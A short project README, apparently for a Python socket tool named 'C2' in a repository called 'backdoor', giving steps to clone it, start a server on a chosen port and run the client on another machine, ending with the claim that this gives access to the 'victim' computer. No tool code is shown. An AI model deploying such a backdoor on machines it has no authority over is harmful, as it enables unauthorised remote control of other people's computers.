# C2

Example of a server and a client keep communication using sockets in python. 

Steps:


clone the project

```sh
$ git clone https://github.com/jmessiass/backdoor.git
```
install requirements and execute the server using python 3 (I recommend to use pyenv).
```sh
$ cd backdoor
$ pip install -r requirements.txt
$ python server.py -p 12345 (choose any port)
```
in another machine, execute the client (before run the client, set the IP from server in HOST and using the same PORT from server)

```sh
$ python client.py
```
if everything occurred good you gain access in computer from victim.
